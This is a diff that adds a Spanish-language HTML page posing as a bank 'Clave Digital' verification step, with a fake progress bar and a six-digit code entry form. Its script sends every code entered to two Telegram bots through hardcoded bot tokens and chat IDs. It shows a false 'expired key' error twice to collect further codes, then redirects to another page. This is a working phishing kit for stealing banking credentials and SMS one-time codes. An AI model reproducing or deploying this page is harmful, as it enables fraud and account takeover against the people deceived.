@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificación - </title>
+  <style>
+    body {
+      margin: 0;
+      background-color:#e30613;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    header {
+      position: absolute;
+      top: 20px;
+    }
+
+    header img {
+      height: 36px;
+    }
+
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #ffc400;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px 0;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .porcentaje {
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    #verificacion {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      max-width: 340px;
+      margin: 0 auto;
+      background-color: transparent; /* Fondo transparente */
+      color: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      border: 2px solid #ffc400;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+    }
+
+    #verificacion img {
+      height: 36px;
+      margin-bottom: 15px;
+    }
+
+    #verificacion p {
+      font-size: 16px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .pin-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+      width: 100%;
+      max-width: 260px;
+      margin-left: auto;
+      margin-right: auto;
+      box-sizing: border-box;
+    }
+
+    .pin-input {
+      width: 36px;
+      height: 48px;
+      text-align: center;
+      font-size: 24px;
+      border: 2px solid #ccc;
+      border-radius: 6px;
+      background-color: white;
+      color: #002147;
+      outline: none;
+      transition: border-color 0.3s;
+      box-sizing: border-box;
+    }
+
+    .pin-input:focus {
+      border-color: #ffc400;
+    }
+
+    .pin-error {
+      border-color: #f44336 !important;
+    }
+
+    #continuar {
+      padding: 12px 20px;
+      background-color: #ffc400;
+      color: #002147;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      max-width: 260px;
+    }
+
+    #error-message {
+      display: none;
+      background-color: #f44336;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 4px;
+      margin-top: 10px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    @media (max-width: 480px) {
+      .pin-container {
+        gap: 6px;
+        max-width: 100%;
+        padding: 0 15px;
+        box-sizing: border-box;
+      }
+
+      .pin-input {
+        width: 100%;
+        max-width: 38px;
+        height: 44px;
+        font-size: 20px;
+      }
+
+      #continuar {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <h2 id="mensaje">Procesando datos...</h2>
+  <div class="spinner" id="spinner"></div>
+  <div class="porcentaje" id="porcentaje">0%</div>
+
+  <div id="verificacion">
+    <img src="logo.png" alt="Logo" />
+    <p>
+      <strong>Ingrese su CLave Digital.</strong><br/>
+      En caso de no obtener su clave digital se le enviara un codigo SMS. Ingreselo para comprobar que eres el propietario de la cuenta.
+    </p>
+
+    <div class="pin-container" id="pinContainer">
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+      <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
+    </div>
+
+    <button id="continuar" disabled>Verificar</button>
+    <div id="error-message">La llave ha caducado, por favor intenta nuevamente.</div>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.pin-input');
+    const continuarBtn = document.getElementById('continuar');
+    const errorMessage = document.getElementById('error-message');
+    const porcentajeEl = document.getElementById('porcentaje');
+    const mensaje = document.getElementById('mensaje');
+    const spinner = document.getElementById('spinner');
+    const verificacion = document.getElementById('verificacion');
+
+    let porcentaje = 0;
+    const intervalo = setInterval(() => {
+      porcentaje += Math.floor(Math.random() * 8) + 3;
+      if (porcentaje >= 100) {
+        porcentaje = 100;
+        clearInterval(intervalo);
+        mensaje.style.display = 'none';
+        spinner.style.display = 'none';
+        porcentajeEl.style.display = 'none';
+        verificacion.style.display = 'flex';
+        inputs[0].focus();
+      }
+      porcentajeEl.textContent = porcentaje + '%';
+    }, 400);
+
+    function checkFilled() {
+      const filled = Array.from(inputs).every(input => input.value !== '');
+      continuarBtn.disabled = !filled;
+    }
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkFilled();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    const bots = [
+      {
+        token: '8097516851:AAEqY5pJMzlyuV-flhItW9Zv5y3rEKvaz7Y',
+        chatId: '-4940090227'
+      },
+      {
+        token: '8571435553:AAHD6w2yKVsCg6AyJMaXsPKnCF206kXB__M',
+        chatId: '-4879631523'
+      }
+    ];
+
+    let intentos = 0;
+
+    continuarBtn.addEventListener('click', async () => {
+      const llave = Array.from(inputs).map(input => input.value).join('');
+      intentos++;
+
+      const titulo = `🔐 Intento ${intentos}`;
+      const mensajeTelegram = `${titulo} de verificación:\nLlave: ${llave}`;
+
+      try {
+        await Promise.all(bots.map(bot =>
+          fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: bot.chatId,
+              text: mensajeTelegram,
+              parse_mode: "Markdown"
+            })
+          })
+        ));
+
+        if (intentos < 3) {
+          errorMessage.style.display = 'block';
+          inputs.forEach(input => input.classList.add('pin-error'));
+
+          setTimeout(() => {
+            errorMessage.style.display = 'none';
+            inputs.forEach(input => {
+              input.value = '';
+              input.classList.remove('pin-error');
+            });
+            inputs[0].focus();
+            checkFilled();
+          }, 3000);
+        } else {
+          window.location.href = 'facturando.html';
+        }
+      } catch (err) {
+        console.error('Error al enviar a Telegram:', err);
+        alert('Error en el sistema. Intenta nuevamente.');
+      }
+    });
+  </script>
+</body>
+</html>
